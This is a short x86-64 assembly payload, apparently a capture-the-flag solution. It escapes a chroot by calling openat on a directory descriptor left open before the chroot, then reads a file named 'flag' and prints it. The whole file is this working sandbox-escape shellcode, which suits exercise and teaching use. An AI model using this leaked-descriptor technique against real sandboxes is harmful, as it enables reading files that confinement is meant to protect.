.global _start
.intel_syntax noprefix

_start:
    # Openat syscall
    mov rdi, 3                   # dirfd (3 because it was opened before chroot)
    lea rsi, [rip + flag]        # pathname (relative to dirfd)
    xor rdx, rdx                 # flags
    xor r10, r10                 # mode
    mov rax, 0x101               # syscall number for openat
    syscall

    # Read syscall
    mov rdi, rax                 # file descriptor returned by openat
    mov rsi, rsp                 # buffer to read into
    mov rdx, 1000                # number of bytes to read
    xor rax, rax                 # syscall number for read
    syscall

    # Write syscall
    mov rdi, 1                   # file descriptor (stdout)
    mov rax, 0x01                # syscall number for write
    syscall

    # Exit syscall
    xor rdi, rdi                 # exit code
    mov rax, 0x3c                # syscall number for exit
    syscall

flag:
    .string "flag"
